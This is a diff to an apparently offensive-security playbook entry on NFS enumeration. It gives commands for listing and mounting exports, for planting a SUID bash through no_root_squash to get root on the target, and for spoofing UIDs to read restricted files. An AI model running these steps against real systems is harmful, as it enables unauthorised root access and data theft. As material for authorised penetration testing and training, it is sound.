@@ -3,16 +3,21 @@ id: nfs-enum
 title: NFS Enumeration
 stage: enumeration
 tags: [linux, nfs]
-tools:
-  - showmount -e $TARGET
-  - sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs
-  - cat /etc/exports | grep no_root_squash
+summary: List and mount NFS exports — no_root_squash and UID spoofing are both direct paths to reading restricted files or planting SUID binaries.
 leads_to:
   - ssh-access
   - linux-suid-caps
 ---
 
-## Enumerate Exports
+## Prerequisites
+
+Port 2049 open. No credentials required — NFS relies on IP-based access control, not passwords.
+
+NFS exports are either unrestricted (world-mountable) or IP-filtered. If you can mount a share, you either get direct file access or, with `no_root_squash`, the ability to create SUID binaries as root from your attacker machine. Even without `no_root_squash`, UID spoofing (creating a local user with the same UID as the file owner) bypasses ACLs on restricted files.
+
+## Quick Win
+
+> List exports — shows what's shared and to whom.
 
 ```bash
 showmount -e $TARGET
@@ -20,26 +25,42 @@ showmount -e $TARGET
 
 ## Mount the Share
 
+> Mount and browse content — treat it like a local filesystem.
+
 ```bash
 sudo mkdir /mnt/nfs
 sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs
 sudo mount -t nfs $TARGET:/share /mnt/nfs
-# Try v3 if v2 fails
+# Try v3 if v2 fails: mount -t nfs -o vers=3 $TARGET:/share /mnt/nfs
 ```
 
 ## no_root_squash Exploitation
 
-If the share exports with `no_root_squash`, your root on the attacker machine = root on the NFS share. You can plant a SUID root binary:
+> Your attacker-side root becomes root on the share — plant a SUID bash.
 
 ```bash
 # On attacker (as root)
 cp /bin/bash /mnt/nfs/bash
 chmod +s /mnt/nfs/bash
 
-# On target
-/share/bash -p
+# On target — execute the planted binary
+/share/bash -p   # -p preserves SUID context
 ```
 
-## Notes
+## UID Spoofing (Without no_root_squash)
 
-`no_root_squash` is the critical flag. Check `/etc/exports` on the target if you get a shell. If it's present and the share is writable from outside, this is a direct root path.
+> Files owned by UID 1001? Create a local user with UID 1001 and you own them.
+
+```bash
+# Check ownership of interesting files on the mount
+ls -lan /mnt/nfs/
+
+# Create matching UID on attacker
+sudo useradd -u 1001 fakeusr
+sudo su fakeusr
+cat /mnt/nfs/restricted_file
+```
+
+## Leads To
+
+SSH key found in home directory export → ssh-access immediately. `no_root_squash` on a user home → plant SUID binary → linux-suid-caps. Configuration files with credentials → try against SSH and other services.
